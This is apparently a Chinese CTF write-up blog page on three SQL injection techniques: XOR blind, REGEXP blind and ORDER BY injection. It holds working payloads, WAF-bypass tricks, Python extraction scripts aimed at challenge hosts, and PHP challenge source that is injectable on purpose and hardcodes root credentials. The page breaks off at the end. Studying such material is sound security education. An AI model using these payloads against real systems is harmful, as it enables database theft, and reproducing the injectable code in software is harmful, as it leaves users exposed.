@@ -1,0 +1,283 @@
+<!DOCTYPE html>
+<html lang="zh">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="renderer" content="webkit">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+    <title>
+        Threezh1&#39;Blog
+    </title>
+    
+<link rel="stylesheet" href="/libs/highlight/styles/monokai-sublime.css">
+
+    
+<link rel="stylesheet" href="/libs/font-awesome/css/font-awesome.min.css">
+
+    
+<link rel="stylesheet" href="/css/style.css">
+
+<meta name="generator" content="Hexo 5.2.0"></head>
+
+<body id="bodyx">
+    <div class="hd posts">
+    <a href="/index.html"><i class="fa fa-reply replay-btn" aria-hidden="true"></i></a>
+    <div class="post-title">
+        <p>
+            从CTF题中学习几种有趣(奇怪)的SQL注入
+        </p>
+        <hr>
+    </div>
+    <div class="post-content">
+        <!--Table of Contents begin-->
+        
+            <div id="toc" class="toc-article">
+            <strong class="toc-title">目录</strong>
+            <a class="js-toggle-toc" href="javascript:void(0)"></a>
+            <div class="toc-content">
+                <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%AF%B4%E5%9C%A8%E5%89%8D%E9%9D%A2"><span class="toc-text">说在前面</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E5%BC%82%E6%88%96%E6%B3%A8%E5%85%A5"><span class="toc-text">1.异或注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-REGEXP%E7%9B%B2%E6%B3%A8"><span class="toc-text">2.REGEXP盲注</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-ORDER-BY-%E6%B3%A8%E5%85%A5"><span class="toc-text">3.ORDER BY 注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83"><span class="toc-text">参考</span></a></li></ol>
+            </div>
+            </div>
+        
+        <!--Table of Contents end -->
+        <h2 id="说在前面"><a href="#说在前面" class="headerlink" title="说在前面"></a>说在前面</h2><p>文章已投稿至先知社区，具体内容：<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/5356">从CTF题中学习几种有趣(奇怪)的SQL注入</a></p>
+<h2 id="1-异或注入"><a href="#1-异或注入" class="headerlink" title="1.异或注入"></a>1.异或注入</h2><p>题目地址：<a target="_blank" rel="noopener" href="http://119.23.73.3:5004/">http://119.23.73.3:5004/</a></p>
+<p>在一个师傅的博客中看到这题的Writeup，尝试按照他的payload进行复现，怎么都复现不出来。后来在安全客上看到另一篇异或注入的文章，才把这个题解决了。</p>
+<p>初步测试之后会发现，题目过滤了<code>空格，+，*，or，substr</code>…等一些字符。而且#号注释也不起作用。</p>
+<p>于是尝试异或注入。</p>
+<pre><code>http://119.23.73.3:5004/?id=1&#39;^&#39;1    返回错误
+http://119.23.73.3:5004/?id=1&#39;^&#39;0    返回正常</code></pre>
+<a id="more"></a>
+<p>在MYSQL命令中：</p>
+<p><img src="https://i.loli.net/2019/06/06/5cf89c0da0cab77879.jpg" alt="01_mysql.jpg"></p>
+<p>可见，当/?id=1’^’1时，传递到数据库当中，是id=0，由于为0的id不存在，所以这里返回错误。第二个同理。</p>
+<p>这里属于布尔盲注，于是构造payload，用脚本跑：</p>
+<p>检索数据库：</p>
+<pre><code>id=2&#39;^!(SELECT(ASCII(MID((SELECT(GROUP_CONCAT(schema_name))FROM(information_schema.schemata)),1,1))=104))^&#39;1&#39;=&#39;1
+
+检索出来的库为：information_schema,moctf,mysql,performance_schema</code></pre>
+<p>检索表：</p>
+<pre><code>id=2&#39;^!(SELECT(ASCII(MID((SELECT(GROUP_CONCAT(table_name))FROM(information_schema.tables)WHERE(table_schema=&#39;moctf&#39;)),1,1))=104))^&#39;1&#39;=&#39;1
+
+检索出来的表：do_y0u_l1ke_long_t4ble_name,news</code></pre>
+<p>检索字段：</p>
+<pre><code>id=2&#39;^!(SELECT(ASCII(MID((SELECT(GROUP_CONCAT(column_name))FROM(information_schema.columns)WHERE(table_name=&#39;do_y0u_l1ke_long_t4ble_name&#39;)),1,1))=104))^&#39;1&#39;=&#39;1
+
+检索出来的字段：d0_you_als0_l1ke_very_long_column_name</code></pre>
+<p>读Flag：</p>
+<pre><code>id=2&#39;^!(SELECT(ASCII(MID((SELECT(GROUP_CONCAT(d0_you_als0_l1ke_very_long_column_name))FROM(moctf.do_y0u_l1ke_long_t4ble_name)),1,1))=104))^&#39;1&#39;=&#39;1
+
+moctfb1ind_SQL_1njecti0n_g0od</code></pre>
+<p>脚本：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="comment">#文字转ascii ord()</span></span><br><span class="line"><span class="comment">#ascii转文字 ascii()</span></span><br><span class="line"></span><br><span class="line">dic = <span class="string">&quot;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_,&quot;</span></span><br><span class="line">url = <span class="string">&quot;http://119.23.73.3:5004/?id=2&#x27;^&quot;</span></span><br><span class="line">keyword = <span class="string">&quot;Tip&quot;</span></span><br><span class="line">string = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">300</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> dic:</span><br><span class="line">        payload = <span class="string">&quot;!(SELECT(ASCII(MID((SELECT(GROUP_CONCAT(schema_name))FROM(information_schema.schemata)),&#123;0&#125;,1))=&#123;1&#125;))^&#x27;1&#x27;=&#x27;1&quot;</span>.<span class="built_in">format</span>(<span class="built_in">str</span>(i),<span class="built_in">ord</span>(j))</span><br><span class="line">        url_get = url + payload</span><br><span class="line">        print(url_get)</span><br><span class="line">        content = requests.get(url_get)</span><br><span class="line">        <span class="keyword">if</span> keyword <span class="keyword">in</span> content.text:</span><br><span class="line">            string += j</span><br><span class="line">            print(string)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">print(<span class="string">&quot;result = &quot;</span> + string)</span><br></pre></td></tr></table></figure>
+
+<p>跑出来的Flag：</p>
+<p><img src="https://i.loli.net/2019/06/06/5cf89c1236ef825006.jpg" alt="01_getflag.jpg"></p>
+<h2 id="2-REGEXP盲注"><a href="#2-REGEXP盲注" class="headerlink" title="2.REGEXP盲注"></a>2.REGEXP盲注</h2><p>题目链接：<a target="_blank" rel="noopener" href="http://ctf5.shiyanbar.com/web/earnest/index.php">http://ctf5.shiyanbar.com/web/earnest/index.php</a></p>
+<p>Writeup(要登录)：<a target="_blank" rel="noopener" href="http://www.shiyanbar.com/ctf/writeup/4828">http://www.shiyanbar.com/ctf/writeup/4828</a></p>
+<p>这道题我本来是信心满满的，然后越做越不对劲。做这道题的时候并没有fuzz的字段还没有逗号，莫名就会被拦截，搞得一头雾水。最后还是跑去看Writeup了。</p>
+<p>先fuzz单字符来看看waf。还是拦截了很多的，而且逗号和空格也被过滤了。</p>
+<p><img src="https://i.loli.net/2019/06/06/5cf89c0f9fde950867.jpg" alt="02_fuzzresult.jpg"></p>
+<p>除此之外，被过滤的还有：is not, union, sleep, substr, benchmark, substring, and。 并且根据大佬的思路，这里的<code>or，+，*</code>也都会被替换为空</p>
+<p>看来时间盲注是没戏了。并且过滤了逗号。</p>
+<p>我们知道，regexp盲注的原理是用正则表达式匹配。</p>
+<p>例子：</p>
+<pre><code>正常的语句为：select username from users where id = 1
+正常返回：admin
+
+构造语句：
+select (select username from users where id = 1) regexp &#39;^a&#39; 返回真(1)
+select (select username from users where id = 1) regexp &#39;^b&#39; 返回假(0)
+
+因为这里&#39;^a&#39;是匹配以a开头的字符串，原来正常返回的就是admin，所以会返回真。
+
+继续就可以使用 regexp &#39;^ad&#39;...读出想要的数据</code></pre>
+<p>那么这里该怎么构造呢？</p>
+<ul>
+<li>获取version</li>
+</ul>
+<p>先用length来判断verison的长度：</p>
+<pre><code>id=11&#39;Or(LENGTH(version())=6)Or&#39;1&#39;=&#39;</code></pre>
+<p>由于^被过滤了，所以用$来从尾部开始读。</p>
+<p>脚本：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">key = <span class="string">&quot;You are in&quot;</span></span><br><span class="line">words = <span class="string">&quot;&quot;</span></span><br><span class="line">data = &#123;<span class="string">&quot;id&quot;</span>: <span class="string">&quot;&quot;</span>&#125;</span><br><span class="line">word = <span class="string">&#x27;0123456789.&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">	<span class="keyword">for</span> j <span class="keyword">in</span> word:</span><br><span class="line">		data[<span class="string">&#x27;id&#x27;</span>] = <span class="string">&quot;11&#x27;Or(SELECT(version()regexp&#x27;&#123;&#125;$&#x27;))Or&#x27;1&#x27;=&#x27;&quot;</span>.<span class="built_in">format</span>(j+words)</span><br><span class="line">		print(data)</span><br><span class="line">		content = requests.post(<span class="string">&quot;http://ctf5.shiyanbar.com/web/earnest/index.php&quot;</span>, data = data)</span><br><span class="line">		<span class="keyword">if</span> key <span class="keyword">in</span> content.text:</span><br><span class="line">			words = <span class="built_in">str</span>(j) + words</span><br><span class="line">			print(words)</span><br></pre></td></tr></table></figure>
+
+<p>最后跑出来为：“5.6..4”</p>
+<ul>
+<li>获取数据库名</li>
+</ul>
+<p>将上面的word替换为：”0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_,”, version()替换为database()即可。</p>
+<p>跑出来为：Ctf_sql_bOol_bLInd</p>
+<ul>
+<li>获取表</li>
+</ul>
+<p>注意这里的seperator里面的or要双写。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">key = <span class="string">&quot;You are in&quot;</span></span><br><span class="line">words = <span class="string">&quot;&quot;</span></span><br><span class="line">data = &#123;<span class="string">&quot;id&quot;</span>: <span class="string">&quot;&quot;</span>&#125;</span><br><span class="line">word = <span class="string">&quot;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!_&#123;&#125;@~.&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">30</span>):</span><br><span class="line">	<span class="keyword">for</span> j <span class="keyword">in</span> word:</span><br><span class="line">		data[<span class="string">&#x27;id&#x27;</span>] = <span class="string">&quot;11&#x27;Or(SELECT((SELECT(group_concat(table_name\nseparatoorr\n&#x27;@&#x27;))FROM(INFORMATION_SCHEMA.tables)WHERE(TABLE_SCHEMA=database()))regexp&#x27;&#123;&#125;$&#x27;))Or&#x27;1&#x27;=&#x27;&quot;</span>.<span class="built_in">format</span>(j+words)</span><br><span class="line">		print(data)</span><br><span class="line">		content = requests.post(<span class="string">&quot;http://ctf5.shiyanbar.com/web/earnest/index.php&quot;</span>, data = data)</span><br><span class="line">		<span class="comment">#print(content.text)</span></span><br><span class="line">		<span class="keyword">if</span> key <span class="keyword">in</span> content.text:</span><br><span class="line">			words = <span class="built_in">str</span>(j) + words</span><br><span class="line">			print(words)</span><br></pre></td></tr></table></figure>
+
+<p>跑出来的表：fIAg@useRs</p>
+<p>可能是脚本的原因，我跑出来的表是有大写有小写。</p>
+<p>并且这里有个坑就是逗号被过滤了，导致group_concat必须使用separator指定字符来分割。</p>
+<ul>
+<li>获取字段</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">key = <span class="string">&quot;You are in&quot;</span></span><br><span class="line">words = <span class="string">&quot;&quot;</span></span><br><span class="line">data = &#123;<span class="string">&quot;id&quot;</span>: <span class="string">&quot;&quot;</span>&#125;</span><br><span class="line">word = <span class="string">&quot;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!_&#123;&#125;@~.&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">30</span>):</span><br><span class="line">	<span class="keyword">for</span> j <span class="keyword">in</span> word:</span><br><span class="line">		data[<span class="string">&#x27;id&#x27;</span>] = <span class="string">&quot;11&#x27;Or(SELECT((SELECT(group_concat(column_name\nseparatoorr\n&#x27;@&#x27;))FROM(INFORMATION_SCHEMA.columns)WHERE(table_name=&#x27;fiag&#x27;))regexp&#x27;&#123;&#125;$&#x27;))Or&#x27;1&#x27;=&#x27;&quot;</span>.<span class="built_in">format</span>(j+words)</span><br><span class="line">		print(data)</span><br><span class="line">		content = requests.post(<span class="string">&quot;http://ctf5.shiyanbar.com/web/earnest/index.php&quot;</span>, data = data)</span><br><span class="line">		<span class="comment">#print(content.text)</span></span><br><span class="line">		<span class="keyword">if</span> key <span class="keyword">in</span> content.text:</span><br><span class="line">			<span class="keyword">if</span> j == <span class="string">&quot;$&quot;</span>:</span><br><span class="line">				words = j+ words</span><br><span class="line">			<span class="keyword">else</span>:</span><br><span class="line">				words = j+ words</span><br><span class="line">			print(words)</span><br></pre></td></tr></table></figure>
+
+<p>这里的坑实在是太奇怪了，当word里面不加点号时，跑出来只有：4g，原因是字段的名字为fl$4g，里面包含一个$导致正则匹配错误。</p>
+<p>Writeup原作者，将点号加到了word里。跑出来就为：fl..g，可以猜测到字段名为：fl$4g (真的是猜测)</p>
+<p>在正则当中，点号是用来匹配任意字符的，这里的$就会被.替代。这里我真的被卡了好久。</p>
+<ul>
+<li>获取flag</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">key = <span class="string">&quot;You are in&quot;</span></span><br><span class="line">words = <span class="string">&quot;&quot;</span></span><br><span class="line">data = &#123;<span class="string">&quot;id&quot;</span>: <span class="string">&quot;&quot;</span>&#125;</span><br><span class="line">word = <span class="string">&quot;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!_&#123;&#125;@~.&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">30</span>):</span><br><span class="line">	<span class="keyword">for</span> j <span class="keyword">in</span> word:</span><br><span class="line">		data[<span class="string">&#x27;id&#x27;</span>] = <span class="string">&quot;11&#x27;Or(SELECT(SELECT(fl$4g)FROM(fiag))regexp&#x27;&#123;&#125;$&#x27;)Or&#x27;1&#x27;=&#x27;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">str</span>(j)+words)</span><br><span class="line">		print(data)</span><br><span class="line">		content = requests.post(<span class="string">&quot;http://ctf5.shiyanbar.com/web/earnest/index.php&quot;</span>, data = data)</span><br><span class="line">		<span class="comment">#print(content.text)</span></span><br><span class="line">		<span class="keyword">if</span> key <span class="keyword">in</span> content.text:</span><br><span class="line">			words = <span class="built_in">str</span>(j) + words</span><br><span class="line">			print(words)</span><br></pre></td></tr></table></figure>
+
+<p>最后跑出来的结果为：</p>
+<pre><code>Fla.&#123;HAh.~YOu.WIn.&#125;</code></pre>
+<p>像跑字段一样尝试之后可以猜测到：</p>
+<p>最后的flag为：</p>
+<pre><code>flag&#123;haha~you win!&#125;</code></pre>
+<ul>
+<li>总结</li>
+</ul>
+<p>这道题其实可以使用mid来做，会更简单，不会再像这个.号一样需要自己去猜。但还是会很多的坑。</p>
+<p>mid方式参考：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/Ragd0ll/p/8684767.html">https://www.cnblogs.com/Ragd0ll/p/8684767.html</a></p>
+<p>这题这样做的意义更多的是学习regexp盲注吧。</p>
+<h2 id="3-ORDER-BY-注入"><a href="#3-ORDER-BY-注入" class="headerlink" title="3.ORDER BY 注入"></a>3.ORDER BY 注入</h2><p>先来看一下ORDER BY注入的原理</p>
+<pre><code>SELECT username, password FROM users order by 1 asc;</code></pre>
+<p>这是一个常见的order by使用语句，后面的数字是列号(也可以指定列名)，asc &amp; desc指定是升序还是降序。</p>
+<p>注意：在order by后面的不会根据计算的结果来排序。</p>
+<p>这里有以下几种方式来进行测试：</p>
+<p><strong>直接加报错注入的payload：</strong></p>
+<pre><code>直接在order by后面加语句：order by (SELECT extractvalue(1,concat(0x7e,(select @@version),0x7e))) 进行报错注入</code></pre>
+<p><strong>rand()方式</strong></p>
+<pre><code>rand()会返回一个0和1之间的随机数，如果参数被赋值，同一个参数会返回同一个数。
+这里就可以用布尔盲注的方式来进行注入
+order by rand(mid(version(),1,1)=5)
+当然这里也可以用时间盲注的方式。</code></pre>
+<p><strong>and payload时间盲注方式</strong></p>
+<pre><code>在order by后面的不会根据计算的结果来排序，但是当我们的payload有延迟命令的时候，页面还是会延迟的。
+
+使用and连接时间延迟payload：
+
+order by 1 and (If(substr(version(),1,1)=5,0,sleep(5)))</code></pre>
+<p>这里用sqllib作为一个学习的例子：</p>
+<p>它的源代码为：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$id</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;sort&#x27;</span>];</span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;SELECT * FROM users ORDER BY <span class="subst">$id</span>&quot;</span>;</span><br></pre></td></tr></table></figure>
+
+<p>报错注入的payload：</p>
+<p>读php版本：</p>
+<pre><code>http://127.0.0.1/sqli/Less-46/index.php?sort=(SELECT extractvalue(1,concat(0x7e,(select @@version),0x7e)))--+</code></pre>
+<p>读表：</p>
+<pre><code>http://127.0.0.1/sqli/Less-46/index.php?sort=(SELECT extractvalue(1,concat(0x7e,(SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema = &#39;security&#39;),0x7e)))--+</code></pre>
+<p>读字段：</p>
+<pre><code>http://127.0.0.1/sqli/Less-46/index.php?sort=(SELECT extractvalue(1,concat(0x7e,(SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name = &#39;users&#39;),0x7e)))--+</code></pre>
+<p>读内容：</p>
+<pre><code>http://127.0.0.1/sqli/Less-46/index.php?sort=(SELECT extractvalue(1,concat(0x7e,(SELECT group_concat(username) FROM users),0x7e)))--+</code></pre>
+<p>rand()方式和and时间盲注的payload基本差不多，这里就不再重复了。</p>
+<p><strong>另一种order by注入</strong></p>
+<p>我自己写了一个题来学习这一种order by注入。题目过滤了F1g3这个字段名。在id=3时，F1g3字段存在flag的base16编码。(直接过滤Flag会更好)</p>
+<p>查询语句：</p>
+<pre><code>$sql = &quot;SELECT id, F1ag, username FROM this_1s_th3_fiag_tab13 WHERE id = &quot;.$id.&quot;;&quot;;</code></pre>
+<p>已知：数据库名：user，表名：this_1s_th3_fiag_tab13，字段名：F1g3，列号为2</p>
+<p>因为过滤了F1g3这个字段名，我们不能直接用普通盲注的方式得到Flag，所以就得使用一种特别的order by盲注。</p>
+<pre><code>访问：
+index.php?id=3 union select 1,2,3 order by 1
+返回：
+id: 1 name: 3 
+id: 3 name: threezh1 </code></pre>
+<p>可以看到这里的1，3分别对应了id和name。 并使用了order by指定id排序。</p>
+<p>当我们将字段1修改为4时，也就是访问：</p>
+<pre><code>index.php?id=3 union select 4,2,3 order by 1</code></pre>
+<p>就会返回：</p>
+<pre><code>id: 3 name: threezh1 
+id: 4 name: 3 </code></pre>
+<p>这是因为，在排序的时候，order by是默认升序排列。select 4,2,3时就会排到后面。</p>
+<p>根据这个差异，我们可以指定按第二列来排序，并在select里猜测flag的值。这样就可以不使用F1g3这个字段名就把值读出来。</p>
+<pre><code>访问：/index.php?id=3 union select 1,&#39;6&#39;,3 order by 2
+返回：
+id: 1 name: 3 
+id: 3 name: threezh1 
+
+访问：/index.php?id=3 union select 1,&#39;7&#39;,3 order by 2
+返回：
+id: 3 name: threezh1 
+id: 1 name: 3 </code></pre>
+<p>出现差别了，因为这里是大于才会出现排序不一样，所以flag的第一个字符为6。</p>
+<p>按照这个思路，写出脚本：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">key = <span class="string">&quot;&lt;tr&gt;&lt;td&gt; id: 3 &lt;/td&gt; &lt;td&gt; name: threezh1 &lt;/td&gt; &lt;br/&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt; id: 3 &lt;/td&gt; &lt;td&gt; name: 3 &lt;/td&gt; &lt;br/&gt;&lt;/tr&gt;&quot;</span></span><br><span class="line">words = <span class="string">&quot;&quot;</span></span><br><span class="line">data = <span class="string">&quot;id=3 union select 3,&#x27;&#123;0&#125;&#x27;,3 order by 2&quot;</span></span><br><span class="line">dic = <span class="string">&quot;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">	<span class="keyword">for</span> j <span class="keyword">in</span> dic:</span><br><span class="line">		payload = data.<span class="built_in">format</span>(words + j)</span><br><span class="line">		print(payload)</span><br><span class="line">		content = requests.get(<span class="string">&quot;http://127.0.0.1/index.php?&quot;</span> + payload)</span><br><span class="line">		<span class="keyword">if</span> key <span class="keyword">in</span> content.text:</span><br><span class="line">			words = words + temp</span><br><span class="line">			print(words)</span><br><span class="line">			<span class="keyword">break</span></span><br><span class="line">		temp = j</span><br></pre></td></tr></table></figure>
+
+
+<p>最后可以直接得到flag的base16编码。</p>
+<p><img src="https://i.loli.net/2019/06/06/5cf89c128eb2126449.jpg" alt="03_getflag.jpg"></p>
+<p>这里有个问题就是，当select 1,2,3 中字段位的数据与数据库里的数据相等时，匹配的时候如果是匹配的是7就是7不用再退一位。</p>
+<p>最后跑出来是 666c61677b643067335f74687265657a68317c</p>
+<p>那么真实的flag的base16编码为：666c61677b643067335f74687265657a68317d</p>
+<p>解码即可</p>
+<p>题目源码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$dbhost</span> = <span class="string">&#x27;localhost&#x27;</span>;  <span class="comment">// mysql服务器主机地址</span></span><br><span class="line"><span class="variable">$dbuser</span> = <span class="string">&#x27;root&#x27;</span>;            <span class="comment">// mysql用户名</span></span><br><span class="line"><span class="variable">$dbpass</span> = <span class="string">&#x27;root&#x27;</span>;          <span class="comment">// mysql用户名密码</span></span><br><span class="line"><span class="variable">$conn</span> = mysqli_connect(<span class="variable">$dbhost</span>, <span class="variable">$dbuser</span>, <span class="variable">$dbpass</span>);</span><br><span class="line"><span class="keyword">if</span>(! <span class="variable">$conn</span> )</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;Could not connect: &#x27;</span> . mysqli_error());</span><br><span class="line">&#125;</span><br><span class="line">mysqli_select_db(<span class="variable">$conn</span>, <span class="string">&#x27;user&#x27;</span>);</span><br><span class="line"><span class="variable">$id</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$id</span>))&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;Please tell me the id , And you should think what is the sort way.&quot;</span>;</span><br><span class="line">	<span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//echo strtolower($id).&quot;&lt;br/&gt;&quot;;</span></span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">&#x27;/(char|hex|conv|lower|lpad|into|password|md5|encode|decode|convert|cast)/i&#x27;</span>,strtolower(<span class="variable">$id</span>)) != <span class="number">0</span>)&#123;	<span class="comment">//|\s</span></span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;NoNoNo&quot;</span>;</span><br><span class="line">	<span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (stripos(<span class="variable">$id</span>, <span class="string">&quot;F1ag&quot;</span>))&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;Close, but No!!! Thinking...&quot;</span>;</span><br><span class="line">	<span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;SELECT id, F1ag, username FROM this_1s_th3_fiag_tab13 WHERE id = &quot;</span>.<span class="variable">$id</span>.<span class="string">&quot;;&quot;</span>;</span><br><span class="line"><span class="variable">$retval</span> = mysqli_query(<span class="variable">$conn</span>, <span class="variable">$sql</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$retval</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;???&#x27;</span>);<span class="comment">// . mysqli_error($conn)</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">while</span>(<span class="variable">$row</span> = mysqli_fetch_array(<span class="variable">$retval</span>, MYSQLI_ASSOC))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;tr&gt;&lt;td&gt; id: <span class="subst">&#123;$row[&#x27;id&#x27;]&#125;</span> &lt;/td&gt; &quot;</span>.</span><br><span class="line">         <span class="string">&quot;&lt;td&gt; name: <span class="subst">&#123;$row[&#x27;username&#x27;]&#125;</span> &lt;/td&gt; &lt;br/&gt;&quot;</span>.</span><br><span class="line">         <span class="string">&quot;&lt;/tr&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">mysqli_close(<span class="variable">$conn</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>sql:</p>
